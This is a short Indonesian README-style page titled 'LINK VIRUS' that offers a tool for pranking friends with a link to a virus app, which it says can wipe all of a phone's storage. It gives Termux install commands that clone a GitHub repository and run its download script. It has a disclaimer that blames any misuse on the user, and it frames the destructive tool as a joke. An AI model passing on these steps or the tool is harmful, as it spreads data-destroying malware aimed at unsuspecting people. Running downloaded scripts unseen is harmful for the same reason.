# LINK VIRUS

   Link virus ini didalamnya ada sebuah link yg berisi aplikasi virus yg bisa anda gunakan untuk ngerjain temen tapi ingat ini berbahaya karena bisa menghapus semua penyimpanan

# GUNAKAN DENGAN BIJAK
 Dosa anda di tanggung sendiri saya tidak menanggung dosa yang anda buat jika menyalah gunakan

# script

pkg update && pkg upgrade               
pkg install figlet                    
pkg install git                  
git clone https://github.com/MrVirusSpm-07/link-virus  
cd link-virus           
sh download.sh            
